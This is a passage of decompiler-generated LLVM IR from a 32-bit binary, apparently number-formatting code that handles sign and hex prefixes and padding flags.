  store i32 %24, i32* %26, align 4, !insn.addr !2566
  store i32 %stack_var_12.0.reload, i32* %stack_var_12.1.reg2mem, !insn.addr !2567
  store i32 %25, i32* %esp.3.reg2mem, !insn.addr !2567
  br label %dec_label_pc_1000556b, !insn.addr !2567

dec_label_pc_1000556b:                            ; preds = %dec_label_pc_10005523, %dec_label_pc_1000553d, %dec_label_pc_10005554
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %stack_var_12.1.reload = load i32, i32* %stack_var_12.1.reg2mem
  %27 = add i32 %ebx.0.reload, 1, !insn.addr !2568
  %28 = add i32 %esi.0.reload, -1, !insn.addr !2569
  %29 = icmp eq i32 %28, 0, !insn.addr !2569
  %30 = icmp eq i1 %29, false, !insn.addr !2570
  store i32 %stack_var_12.1.reload, i32* %stack_var_12.0.reg2mem, !insn.addr !2570
  store i32 %27, i32* %ebx.0.reg2mem, !insn.addr !2570
  store i32 %esp.3.reload, i32* %esp.0.reg2mem, !insn.addr !2570
  store i32 %28, i32* %esi.0.reg2mem, !insn.addr !2570
  store i32 %stack_var_12.1.reload, i32* %stack_var_12.2.reg2mem, !insn.addr !2570
  br i1 %30, label %dec_label_pc_10005523, label %dec_label_pc_10005572, !insn.addr !2570

dec_label_pc_10005572:                            ; preds = %dec_label_pc_1000556b, %dec_label_pc_10005510
  %stack_var_12.2.reload = load i32, i32* %stack_var_12.2.reg2mem
  %sext2 = mul i32 %stack_var_12.2.reload, 16777216
  %31 = sdiv i32 %sext2, 16777216, !insn.addr !2571
  %32 = add i32 %arg1, 4, !insn.addr !2572
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2572
  store i32 %arg3, i32* %33, align 4, !insn.addr !2572
  %34 = inttoptr i32 %arg1 to i32*, !insn.addr !2573
  store i32 %31, i32* %34, align 4, !insn.addr !2573
  ret i32 %arg1, !insn.addr !2574
}

define i32 @function_10005590(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32* %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_10005590:
  %ecx.0.reg2mem = alloca i32, !insn.addr !2575
  %eax.3.reg2mem = alloca i32, !insn.addr !2575
  %eax.2.reg2mem = alloca i32, !insn.addr !2575
  %edi.1.reg2mem = alloca i32, !insn.addr !2575
  %eax.1.reg2mem = alloca i32, !insn.addr !2575
  %.pre-phi10.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi12.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi14.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi16.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi18.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi20.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi23.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi27.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi31.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi35.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi39.reg2mem = alloca i32*, !insn.addr !2575
  %.pre-phi43.reg2mem = alloca i32*, !insn.addr !2575
  %storemerge.reg2mem = alloca i32, !insn.addr !2575
  %esp.3.reg2mem = alloca i32, !insn.addr !2575
  %edi.0.reg2mem = alloca i32, !insn.addr !2575
  %esi.0.reg2mem = alloca i32, !insn.addr !2575
  %esp.2.reg2mem = alloca i32, !insn.addr !2575
  %.reg2mem = alloca i8, !insn.addr !2575
  %esp.1.reg2mem = alloca i32, !insn.addr !2575
  %esp.0.reg2mem = alloca i32, !insn.addr !2575
  %ebx.0.reg2mem = alloca i32, !insn.addr !2575
  %storemerge4.reg2mem = alloca i32, !insn.addr !2575
  %stack_var_-96 = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-44 = alloca i8, align 1
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2576
  store i32 %2, i32* %stack_var_-16, align 4, !insn.addr !2577
  %3 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2578
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2579
  %4 = icmp eq i32 %arg8, 0, !insn.addr !2580
  br i1 %4, label %dec_label_pc_100055e5, label %dec_label_pc_100055d4, !insn.addr !2581

dec_label_pc_100055d4:                            ; preds = %dec_label_pc_10005590
  %5 = bitcast i32* %arg7 to i8*, !insn.addr !2582
  %6 = load i8, i8* %5, align 1, !insn.addr !2582
  %7 = icmp ne i8 %6, 43, !insn.addr !2583
  %8 = icmp eq i8 %6, 45, !insn.addr !2584
  %9 = icmp eq i1 %8, false, !insn.addr !2585
  %or.cond = icmp eq i1 %7, %9
  store i32 1, i32* %storemerge4.reg2mem, !insn.addr !2586
  br i1 %or.cond, label %dec_label_pc_100055e5, label %dec_label_pc_100055e7, !insn.addr !2586

dec_label_pc_100055e5:                            ; preds = %dec_label_pc_100055d4, %dec_label_pc_10005590
  store i32 0, i32* %storemerge4.reg2mem, !insn.addr !2587
  br label %dec_label_pc_100055e7, !insn.addr !2587

dec_label_pc_100055e7:                            ; preds = %dec_label_pc_100055d4, %dec_label_pc_100055e5
  %10 = ptrtoint i32* %arg7 to i32
  %storemerge4.reload = load i32, i32* %storemerge4.reg2mem
  %11 = add i32 %arg5, 20, !insn.addr !2588
  %12 = inttoptr i32 %11 to i32*, !insn.addr !2588
  %13 = load i32, i32* %12, align 4, !insn.addr !2588
  %14 = and i32 %13, 3584, !insn.addr !2589
  %15 = icmp eq i32 %14, 2048, !insn.addr !2590
  %16 = icmp eq i1 %15, false, !insn.addr !2591
  store i32 %storemerge4.reload, i32* %ebx.0.reg2mem, !insn.addr !2591
  br i1 %16, label %dec_label_pc_10005613, label %dec_label_pc_100055f6, !insn.addr !2591

dec_label_pc_100055f6:                            ; preds = %dec_label_pc_100055e7
  %17 = or i32 %storemerge4.reload, 2, !insn.addr !2592
  %18 = icmp ugt i32 %17, %arg8
  store i32 %storemerge4.reload, i32* %ebx.0.reg2mem, !insn.addr !2593
  br i1 %18, label %dec_label_pc_10005613, label %dec_label_pc_100055fd, !insn.addr !2593

dec_label_pc_100055fd:                            ; preds = %dec_label_pc_100055f6
  %19 = add i32 %storemerge4.reload, %10
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2594
  %21 = load i8, i8* %20, align 1, !insn.addr !2594
  %22 = icmp eq i8 %21, 48, !insn.addr !2594
  %23 = icmp eq i1 %22, false, !insn.addr !2595
  store i32 %storemerge4.reload, i32* %ebx.0.reg2mem, !insn.addr !2595
  br i1 %23, label %dec_label_pc_10005613, label %dec_label_pc_10005603, !insn.addr !2595

dec_label_pc_10005603:                            ; preds = %dec_label_pc_100055fd
  %24 = add i32 %19, 1, !insn.addr !2596
  %25 = inttoptr i32 %24 to i8*, !insn.addr !2596
  %26 = load i8, i8* %25, align 1, !insn.addr !2596
  %27 = icmp ne i8 %26, 120, !insn.addr !2597
  %28 = icmp eq i8 %26, 88, !insn.addr !2598
  %29 = icmp eq i1 %28, false, !insn.addr !2599
  %or.cond7 = icmp eq i1 %27, %29
  %spec.select9 = select i1 %or.cond7, i32 %storemerge4.reload, i32 %17
  store i32 %spec.select9, i32* %ebx.0.reg2mem
  br label %dec_label_pc_10005613

dec_label_pc_10005613:                            ; preds = %dec_label_pc_10005603, %dec_label_pc_100055f6, %dec_label_pc_100055fd, %dec_label_pc_100055e7
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %30 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2600
  store i32 %30, i32* %stack_var_-120, align 4, !insn.addr !2600
  store i32 %30, i32* %stack_var_-124, align 4, !insn.addr !2601
  %31 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !2602
  %32 = icmp eq i32 %1, 0, !insn.addr !2603
  store i32 %31, i32* %esp.0.reg2mem, !insn.addr !2604
  br i1 %32, label %dec_label_pc_10005650, label %dec_label_pc_1000563f, !insn.addr !2604

dec_label_pc_1000563f:                            ; preds = %dec_label_pc_10005613
  %33 = inttoptr i32 %1 to i32*, !insn.addr !2605
  %34 = load i32, i32* %33, align 4, !insn.addr !2605
  %35 = icmp eq i32 %34, 0, !insn.addr !2606
  store i32 %31, i32* %esp.0.reg2mem, !insn.addr !2607
  br i1 %35, label %dec_label_pc_10005650, label %dec_label_pc_10005648, !insn.addr !2607

dec_label_pc_10005648:                            ; preds = %dec_label_pc_1000563f
  store i32 1, i32* %stack_var_-124, align 4, !insn.addr !2608
  %36 = ptrtoint i32* %stack_var_-124 to i32, !insn.addr !2608
  store i32 %36, i32* %esp.0.reg2mem, !insn.addr !2609
  br label %dec_label_pc_10005650, !insn.addr !2609

dec_label_pc_10005650:                            ; preds = %dec_label_pc_10005648, %dec_label_pc_1000563f, %dec_label_pc_10005613
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %37 = add i32 %esp.0.reload, -4, !insn.addr !2610
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2610
  store i32 0, i32* %38, align 4, !insn.addr !2610
  %39 = add i32 %esp.0.reload, -8, !insn.addr !2611
  %40 = inttoptr i32 %39 to i32*, !insn.addr !2611
  store i32 %arg8, i32* %40, align 4, !insn.addr !2611
  store i8 0, i8* %stack_var_-44, align 1, !insn.addr !2612
  %41 = ptrtoint i8* %stack_var_-44 to i32, !insn.addr !2613
  %42 = add i32 %esp.0.reload, -12, !insn.addr !2614
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2614
  store i32 %41, i32* %43, align 4, !insn.addr !2614
  %44 = add i32 %10, %arg8, !insn.addr !2615
  %45 = add i32 %esp.0.reload, -16, !insn.addr !2616
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2616
  store i32 %44, i32* %46, align 4, !insn.addr !2616
  %47 = add i32 %esp.0.reload, -20, !insn.addr !2617
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2617
  store i32 %10, i32* %48, align 4, !insn.addr !2617
  %49 = add i32 %esp.0.reload, -24, !insn.addr !2618
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2618
  store i32 %30, i32* %50, align 4, !insn.addr !2618
  %51 = add i32 %esp.0.reload, -28, !insn.addr !2619
  %52 = inttoptr i32 %51 to i32*, !insn.addr !2619
  store i32 %30, i32* %52, align 4, !insn.addr !2619
  %53 = load i32, i32* %stack_var_-124, align 4, !insn.addr !2620
  %54 = inttoptr i32 %53 to i32*, !insn.addr !2620
  %55 = load i32, i32* %stack_var_-120, align 4, !insn.addr !2620
  %56 = inttoptr i32 %55 to i32*, !insn.addr !2620
  %57 = call i32 @function_10006dc0(i32* %54, i32* %56), !insn.addr !2620
  store i32 %49, i32* %esp.1.reg2mem, !insn.addr !2621
  br i1 %32, label %dec_label_pc_100056d3, label %dec_label_pc_100056c2, !insn.addr !2621

dec_label_pc_100056c2:                            ; preds = %dec_label_pc_10005650
  %58 = inttoptr i32 %1 to i32*, !insn.addr !2622
  %59 = load i32, i32* %58, align 4, !insn.addr !2622
  %60 = icmp eq i32 %59, 0, !insn.addr !2623
  store i32 %49, i32* %esp.1.reg2mem, !insn.addr !2624
  br i1 %60, label %dec_label_pc_100056d3, label %dec_label_pc_100056cb, !insn.addr !2624

dec_label_pc_100056cb:                            ; preds = %dec_label_pc_100056c2
  store i32 1, i32* %52, align 4, !insn.addr !2625
  store i32 %51, i32* %esp.1.reg2mem, !insn.addr !2626
  br label %dec_label_pc_100056d3, !insn.addr !2626

dec_label_pc_100056d3:                            ; preds = %dec_label_pc_100056cb, %dec_label_pc_100056c2, %dec_label_pc_10005650
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %61 = add i32 %esp.1.reload, -4, !insn.addr !2627
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2627
  %63 = ptrtoint i8* %stack_var_-68 to i32, !insn.addr !2627
  store i32 %63, i32* %62, align 4, !insn.addr !2627
  %64 = call i32 @function_10006360(i32 %57), !insn.addr !2628
  %65 = icmp ult i32 %0, 16, !insn.addr !2629
  %66 = icmp eq i1 %65, false, !insn.addr !2630
  %67 = load i8, i8* %stack_var_-68, align 1, !insn.addr !2630
  %68 = sext i8 %67 to i32, !insn.addr !2630
  %69 = select i1 %66, i32 %68, i32 %63, !insn.addr !2630
  %70 = inttoptr i32 %69 to i8*, !insn.addr !2631
  %71 = load i8, i8* %70, align 1, !insn.addr !2631
  %72 = icmp eq i8 %71, 127, !insn.addr !2632
  %73 = icmp slt i8 %71, 1
  %or.cond8 = or i1 %72, %73
  store i32 %61, i32* %esp.3.reg2mem, !insn.addr !2633
  br i1 %or.cond8, label %dec_label_pc_10005742, label %dec_label_pc_100056fb, !insn.addr !2633

dec_label_pc_100056fb:                            ; preds = %dec_label_pc_100056d3
  %74 = inttoptr i32 %57 to i32*, !insn.addr !2634
  %75 = load i32, i32* %74, align 4, !insn.addr !2634
  %76 = add i32 %75, 16, !insn.addr !2635
  %77 = inttoptr i32 %76 to i32*, !insn.addr !2635
  %78 = load i32, i32* %77, align 4, !insn.addr !2635
  %sext = mul i32 %78, 16777216
  %79 = sdiv i32 %sext, 16777216, !insn.addr !2636
  store i8 %71, i8* %.reg2mem
  store i32 %61, i32* %esp.2.reg2mem
  store i32 %69, i32* %esi.0.reg2mem
  store i32 %arg8, i32* %edi.0.reg2mem
  br label %dec_label_pc_10005710

dec_label_pc_10005710:                            ; preds = %dec_label_pc_100056fb, %dec_label_pc_10005721
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %.reload = load i8, i8* %.reg2mem, !insn.addr !2637
  %80 = icmp slt i8 %.reload, 1
  store i32 %esp.2.reload, i32* %esp.3.reg2mem, !insn.addr !2638
  br i1 %80, label %dec_label_pc_10005742, label %dec_label_pc_10005716, !insn.addr !2638

dec_label_pc_10005716:                            ; preds = %dec_label_pc_10005710
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %81 = sext i8 %.reload to i32, !insn.addr !2639
  %82 = sub i32 %edi.0.reload, %ebx.0.reload, !insn.addr !2640
  %83 = icmp ugt i32 %82, %81, !insn.addr !2641
  %84 = icmp eq i1 %83, false, !insn.addr !2642
  store i32 %esp.2.reload, i32* %esp.3.reg2mem, !insn.addr !2642
  br i1 %84, label %dec_label_pc_10005742, label %dec_label_pc_10005721, !insn.addr !2642

dec_label_pc_10005721:                            ; preds = %dec_label_pc_10005716
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %85 = add i32 %esp.2.reload, -4, !insn.addr !2643
  %86 = inttoptr i32 %85 to i32*, !insn.addr !2643
  store i32 %79, i32* %86, align 4, !insn.addr !2643
  %87 = sub i32 %edi.0.reload, %81, !insn.addr !2644
  %88 = add i32 %esp.2.reload, -8, !insn.addr !2645
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2645
  store i32 1, i32* %89, align 4, !insn.addr !2645
  %90 = add i32 %esp.2.reload, -12, !insn.addr !2646
  %91 = inttoptr i32 %90 to i32*, !insn.addr !2646
  store i32 %87, i32* %91, align 4, !insn.addr !2646
  %92 = add i32 %esi.0.reload, 1, !insn.addr !2647
  %93 = inttoptr i32 %92 to i8*, !insn.addr !2647
  %94 = load i8, i8* %93, align 1, !insn.addr !2647
  %95 = icmp sgt i8 %94, 0
  %96 = zext i1 %95 to i32, !insn.addr !2648
  %97 = add i32 %esi.0.reload, %96, !insn.addr !2649
  %98 = inttoptr i32 %97 to i8*, !insn.addr !2650
  %99 = load i8, i8* %98, align 1, !insn.addr !2650
  %100 = icmp eq i8 %99, 127, !insn.addr !2650
  %101 = icmp eq i1 %100, false, !insn.addr !2651
  store i8 %99, i8* %.reg2mem, !insn.addr !2651
  store i32 %90, i32* %esp.2.reg2mem, !insn.addr !2651
  store i32 %97, i32* %esi.0.reg2mem, !insn.addr !2651
  store i32 %87, i32* %edi.0.reg2mem, !insn.addr !2651
  store i32 %90, i32* %esp.3.reg2mem, !insn.addr !2651
  br i1 %101, label %dec_label_pc_10005710, label %dec_label_pc_10005742, !insn.addr !2651

dec_label_pc_10005742:                            ; preds = %dec_label_pc_10005721, %dec_label_pc_10005716, %dec_label_pc_10005710, %dec_label_pc_100056d3
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %102 = add i32 %arg5, 36, !insn.addr !2652
  %103 = inttoptr i32 %102 to i32*, !insn.addr !2652
  %104 = load i32, i32* %103, align 4, !insn.addr !2652
  %105 = icmp slt i32 %104, 0, !insn.addr !2652
  store i32 0, i32* %storemerge.reg2mem, !insn.addr !2653
  br i1 %105, label %dec_label_pc_10005766, label %dec_label_pc_10005751, !insn.addr !2653

dec_label_pc_10005751:                            ; preds = %dec_label_pc_10005742
  %.pre44 = add i32 %arg5, 32
  %.pre46 = inttoptr i32 %.pre44 to i32*
  %.pre48 = load i32, i32* %.pre46, align 4
  %106 = or i32 %104, %.pre48
  %107 = icmp eq i32 %106, 0
  %spec.select = select i1 %107, i32 0, i32 %.pre48
  store i32 %spec.select, i32* %storemerge.reg2mem
  br label %dec_label_pc_10005766

dec_label_pc_10005766:                            ; preds = %dec_label_pc_10005751, %dec_label_pc_10005742
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %108 = load i32, i32* %12, align 4, !insn.addr !2654
  %109 = and i32 %108, 448, !insn.addr !2655
  switch i32 %109, label %dec_label_pc_1000577e [
    i32 64, label %dec_label_pc_1000580e
    i32 256, label %dec_label_pc_100057c6
  ]

dec_label_pc_1000577e:                            ; preds = %dec_label_pc_10005766
  %110 = add i32 %esp.3.reload, -4
  %111 = inttoptr i32 %110 to i32*
  store i32 %storemerge.reload, i32* %111, align 4, !insn.addr !2656
  %112 = add i32 %esp.3.reload, -8
  %113 = inttoptr i32 %112 to i32*
  store i32 %arg6, i32* %113, align 4, !insn.addr !2657
  %114 = add i32 %esp.3.reload, -12
  %115 = inttoptr i32 %114 to i32*
  store i32 %arg4, i32* %115, align 4, !insn.addr !2658
  %116 = add i32 %esp.3.reload, -16
  %117 = inttoptr i32 %116 to i32*
  store i32 %arg3, i32* %117, align 4, !insn.addr !2659
  %118 = add i32 %esp.3.reload, -20
  %119 = inttoptr i32 %118 to i32*
  store i32 %30, i32* %119, align 4, !insn.addr !2660
  %120 = add i32 %esp.3.reload, -24
  %121 = inttoptr i32 %120 to i32*
  store i32 %arg1, i32* %121, align 4, !insn.addr !2661
  %122 = call i32 @function_100054a0(i32 0, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2662
  %123 = add i32 %esp.3.reload, -28
  %124 = inttoptr i32 %123 to i32*
  store i32 %ebx.0.reload, i32* %124, align 4, !insn.addr !2663
  %125 = inttoptr i32 %122 to i32*, !insn.addr !2664
  %126 = load i32, i32* %125, align 4, !insn.addr !2664
  %127 = add i32 %122, 4, !insn.addr !2665
  %128 = inttoptr i32 %127 to i32*, !insn.addr !2665
  %129 = load i32, i32* %128, align 4, !insn.addr !2665
  %130 = add i32 %esp.3.reload, -32
  %131 = inttoptr i32 %130 to i32*
  store i32 %41, i32* %131, align 4, !insn.addr !2666
  %132 = load i32, i32* %128, align 4, !insn.addr !2667
  %133 = add i32 %esp.3.reload, -36
  %134 = inttoptr i32 %133 to i32*
  store i32 %132, i32* %134, align 4, !insn.addr !2667
  %135 = load i32, i32* %125, align 4, !insn.addr !2668
  %136 = add i32 %esp.3.reload, -40
  %137 = inttoptr i32 %136 to i32*
  store i32 %135, i32* %137, align 4, !insn.addr !2668
  %138 = add i32 %esp.3.reload, -44
  %139 = inttoptr i32 %138 to i32*
  store i32 %30, i32* %139, align 4, !insn.addr !2669
  %140 = add i32 %esp.3.reload, -48
  %141 = inttoptr i32 %140 to i32*
  store i32 %arg1, i32* %141, align 4, !insn.addr !2670
  %142 = call i32 @function_10005510(i32 %126, i32 %129, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2671
  store i32* %141, i32** %.pre-phi43.reg2mem, !insn.addr !2672
  store i32* %139, i32** %.pre-phi39.reg2mem, !insn.addr !2672
  store i32* %137, i32** %.pre-phi35.reg2mem, !insn.addr !2672
  store i32* %134, i32** %.pre-phi31.reg2mem, !insn.addr !2672
  store i32* %131, i32** %.pre-phi27.reg2mem, !insn.addr !2672
  store i32* %124, i32** %.pre-phi23.reg2mem, !insn.addr !2672
  store i32* %121, i32** %.pre-phi20.reg2mem, !insn.addr !2672
  store i32* %119, i32** %.pre-phi18.reg2mem, !insn.addr !2672
  store i32* %117, i32** %.pre-phi16.reg2mem, !insn.addr !2672
  store i32* %115, i32** %.pre-phi14.reg2mem, !insn.addr !2672
  store i32* %113, i32** %.pre-phi12.reg2mem, !insn.addr !2672
  store i32* %111, i32** %.pre-phi10.reg2mem, !insn.addr !2672
  store i32 %142, i32* %eax.1.reg2mem, !insn.addr !2672
  store i32 0, i32* %edi.1.reg2mem, !insn.addr !2672
  br label %dec_label_pc_10005830, !insn.addr !2672

dec_label_pc_100057c6:                            ; preds = %dec_label_pc_10005766
  %143 = add i32 %esp.3.reload, -4
  %144 = inttoptr i32 %143 to i32*
  store i32 %ebx.0.reload, i32* %144, align 4, !insn.addr !2673
  %145 = add i32 %esp.3.reload, -8
  %146 = inttoptr i32 %145 to i32*
  store i32 %41, i32* %146, align 4, !insn.addr !2674
  %147 = add i32 %esp.3.reload, -12
  %148 = inttoptr i32 %147 to i32*
  store i32 %arg4, i32* %148, align 4, !insn.addr !2675
  %149 = add i32 %esp.3.reload, -16
  %150 = inttoptr i32 %149 to i32*
  store i32 %arg3, i32* %150, align 4, !insn.addr !2676
  %151 = add i32 %esp.3.reload, -20
  %152 = inttoptr i32 %151 to i32*
  store i32 %30, i32* %152, align 4, !insn.addr !2677
  %153 = add i32 %esp.3.reload, -24
  %154 = inttoptr i32 %153 to i32*
  store i32 %arg1, i32* %154, align 4, !insn.addr !2678
  %155 = call i32 @function_10005510(i32 0, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2679
  %156 = add i32 %esp.3.reload, -28
  %157 = inttoptr i32 %156 to i32*
  store i32 %storemerge.reload, i32* %157, align 4, !insn.addr !2680
  %158 = add i32 %esp.3.reload, -32
  %159 = inttoptr i32 %158 to i32*
  store i32 %arg6, i32* %159, align 4, !insn.addr !2681
  %160 = inttoptr i32 %155 to i32*, !insn.addr !2682
  %161 = load i32, i32* %160, align 4, !insn.addr !2682
  %162 = add i32 %155, 4, !insn.addr !2683
  %163 = inttoptr i32 %162 to i32*, !insn.addr !2683
  %164 = load i32, i32* %163, align 4, !insn.addr !2683
  %165 = add i32 %esp.3.reload, -36
  %166 = inttoptr i32 %165 to i32*
  store i32 %164, i32* %166, align 4, !insn.addr !2684
  %167 = load i32, i32* %160, align 4, !insn.addr !2685
  %168 = add i32 %esp.3.reload, -40
  %169 = inttoptr i32 %168 to i32*
  store i32 %167, i32* %169, align 4, !insn.addr !2685
  %170 = add i32 %esp.3.reload, -44
  %171 = inttoptr i32 %170 to i32*
  store i32 %30, i32* %171, align 4, !insn.addr !2686
  %172 = add i32 %esp.3.reload, -48
  %173 = inttoptr i32 %172 to i32*
  store i32 %arg1, i32* %173, align 4, !insn.addr !2687
  %174 = call i32 @function_100054a0(i32 %161, i32 %164, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2688
  store i32* %173, i32** %.pre-phi43.reg2mem, !insn.addr !2689
  store i32* %171, i32** %.pre-phi39.reg2mem, !insn.addr !2689
  store i32* %169, i32** %.pre-phi35.reg2mem, !insn.addr !2689
  store i32* %166, i32** %.pre-phi31.reg2mem, !insn.addr !2689
  store i32* %159, i32** %.pre-phi27.reg2mem, !insn.addr !2689
  store i32* %157, i32** %.pre-phi23.reg2mem, !insn.addr !2689
  store i32* %154, i32** %.pre-phi20.reg2mem, !insn.addr !2689
  store i32* %152, i32** %.pre-phi18.reg2mem, !insn.addr !2689
  store i32* %150, i32** %.pre-phi16.reg2mem, !insn.addr !2689
  store i32* %148, i32** %.pre-phi14.reg2mem, !insn.addr !2689
  store i32* %146, i32** %.pre-phi12.reg2mem, !insn.addr !2689
  store i32* %144, i32** %.pre-phi10.reg2mem, !insn.addr !2689
  store i32 %174, i32* %eax.1.reg2mem, !insn.addr !2689
  store i32 0, i32* %edi.1.reg2mem, !insn.addr !2689
  br label %dec_label_pc_10005830, !insn.addr !2689

dec_label_pc_1000580e:                            ; preds = %dec_label_pc_10005766
  %175 = add i32 %esp.3.reload, -4
  %176 = inttoptr i32 %175 to i32*
  store i32 %ebx.0.reload, i32* %176, align 4, !insn.addr !2690
  %177 = add i32 %esp.3.reload, -8
  %178 = inttoptr i32 %177 to i32*
  store i32 %41, i32* %178, align 4, !insn.addr !2691
  %179 = add i32 %esp.3.reload, -12
  %180 = inttoptr i32 %179 to i32*
  store i32 %arg4, i32* %180, align 4, !insn.addr !2692
  %181 = add i32 %esp.3.reload, -16
  %182 = inttoptr i32 %181 to i32*
  store i32 %arg3, i32* %182, align 4, !insn.addr !2693
  %183 = add i32 %esp.3.reload, -20
  %184 = inttoptr i32 %183 to i32*
  store i32 %30, i32* %184, align 4, !insn.addr !2694
  %185 = add i32 %esp.3.reload, -24
  %186 = inttoptr i32 %185 to i32*
  store i32 %arg1, i32* %186, align 4, !insn.addr !2695
  %187 = call i32 @function_10005510(i32 0, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !2696
  %.pre = add i32 %esp.3.reload, -28, !insn.addr !2697
  %.pre22 = inttoptr i32 %.pre to i32*, !insn.addr !2697
  %.pre24 = add i32 %esp.3.reload, -32, !insn.addr !2698
  %.pre26 = inttoptr i32 %.pre24 to i32*, !insn.addr !2698
  %.pre28 = add i32 %esp.3.reload, -36, !insn.addr !2699
  %.pre30 = inttoptr i32 %.pre28 to i32*, !insn.addr !2699
  %.pre32 = add i32 %esp.3.reload, -40, !insn.addr !2700
  %.pre34 = inttoptr i32 %.pre32 to i32*, !insn.addr !2700
  %.pre36 = add i32 %esp.3.reload, -44, !insn.addr !2701
  %.pre38 = inttoptr i32 %.pre36 to i32*, !insn.addr !2701
  %.pre40 = add i32 %esp.3.reload, -48, !insn.addr !2702
  %.pre42 = inttoptr i32 %.pre40 to i32*, !insn.addr !2702
  store i32* %.pre42, i32** %.pre-phi43.reg2mem, !insn.addr !2703
  store i32* %.pre38, i32** %.pre-phi39.reg2mem, !insn.addr !2703
  store i32* %.pre34, i32** %.pre-phi35.reg2mem, !insn.addr !2703
  store i32* %.pre30, i32** %.pre-phi31.reg2mem, !insn.addr !2703
  store i32* %.pre26, i32** %.pre-phi27.reg2mem, !insn.addr !2703
  store i32* %.pre22, i32** %.pre-phi23.reg2mem, !insn.addr !2703
  store i32* %186, i32** %.pre-phi20.reg2mem, !insn.addr !2703
  store i32* %184, i32** %.pre-phi18.reg2mem, !insn.addr !2703
  store i32* %182, i32** %.pre-phi16.reg2mem, !insn.addr !2703
  store i32* %180, i32** %.pre-phi14.reg2mem, !insn.addr !2703
  store i32* %178, i32** %.pre-phi12.reg2mem, !insn.addr !2703
  store i32* %176, i32** %.pre-phi10.reg2mem, !insn.addr !2703
  store i32 %187, i32* %eax.1.reg2mem, !insn.addr !2703
  store i32 %storemerge.reload, i32* %edi.1.reg2mem, !insn.addr !2703
  br label %dec_label_pc_10005830, !insn.addr !2703

dec_label_pc_10005830:                            ; preds = %dec_label_pc_1000580e, %dec_label_pc_100057c6, %dec_label_pc_1000577e
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %.pre-phi10.reload = load i32*, i32** %.pre-phi10.reg2mem
  %.pre-phi12.reload = load i32*, i32** %.pre-phi12.reg2mem
  %.pre-phi14.reload = load i32*, i32** %.pre-phi14.reg2mem
  %.pre-phi16.reload = load i32*, i32** %.pre-phi16.reg2mem
  %.pre-phi18.reload = load i32*, i32** %.pre-phi18.reg2mem
  %.pre-phi20.reload = load i32*, i32** %.pre-phi20.reg2mem
  %.pre-phi23.reload = load i32*, i32** %.pre-phi23.reg2mem
  %.pre-phi27.reload = load i32*, i32** %.pre-phi27.reg2mem
  %.pre-phi31.reload = load i32*, i32** %.pre-phi31.reg2mem
  %.pre-phi35.reload = load i32*, i32** %.pre-phi35.reg2mem
  %.pre-phi39.reload = load i32*, i32** %.pre-phi39.reg2mem
  %.pre-phi43.reload = load i32*, i32** %.pre-phi43.reg2mem
  %188 = inttoptr i32 %eax.1.reload to i32*, !insn.addr !2704
  %189 = load i32, i32* %188, align 4, !insn.addr !2704
  %190 = add i32 %eax.1.reload, 4, !insn.addr !2705
  %191 = inttoptr i32 %190 to i32*, !insn.addr !2705
  %192 = load i32, i32* %191, align 4, !insn.addr !2705
  %193 = sub nsw i32 0, %ebx.0.reload, !insn.addr !2706
  store i32 %193, i32* %.pre-phi10.reload, align 4, !insn.addr !2707
  %194 = add i32 %ebx.0.reload, %41, !insn.addr !2708
  store i32 %194, i32* %.pre-phi12.reload, align 4, !insn.addr !2709
  store i32 %192, i32* %.pre-phi14.reload, align 4, !insn.addr !2710
  store i32 %189, i32* %.pre-phi16.reload, align 4, !insn.addr !2711
